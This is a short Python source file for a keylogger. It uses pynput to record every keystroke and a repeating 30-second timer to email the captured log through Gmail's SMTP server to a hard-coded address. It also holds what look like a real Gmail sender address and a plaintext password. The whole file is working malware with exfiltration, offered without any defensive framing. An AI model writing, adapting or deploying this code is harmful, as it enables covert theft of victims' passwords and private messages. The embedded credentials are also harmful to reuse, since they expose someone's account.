import pynput.keyboard
import smtplib
import threading

log = ""

def Listener_function(key):
    global log
    try:
        log = log + str(key.char)
    except AttributeError:
        if key==key.space:
            log = log + " "
        else:
            log = log + str(key)
    except:
          pass

    print(log)


def semd_email(from_address,to_email_address,password,message):
    # HOST AND PORT FOR EMAIL SERVER
    email_server = smtplib.SMTP("smtp.gmail.com",587)
    email_server.starttls()
    email_server.login(from_address,password)
    email_server.sendmail(from_address,to_email_address,message)
    email_server.quit()


# Callback_fonction = Listener_fonction
keylogger_listener = pynput.keyboard.Listener(on_press=Listener_function)


def thread_function():
    global log
    semd_email("kaankoc4900@gmail.com","kaankox42@gmail.com","4900Koc!",log.encode("utf-8"))
    log = ""
    timer_object = threading.Timer(30,thread_function)
    timer_object.start()

# Threading = Performing multiple jobs at the same time
with keylogger_listener:
    thread_function()
    keylogger_listener.join()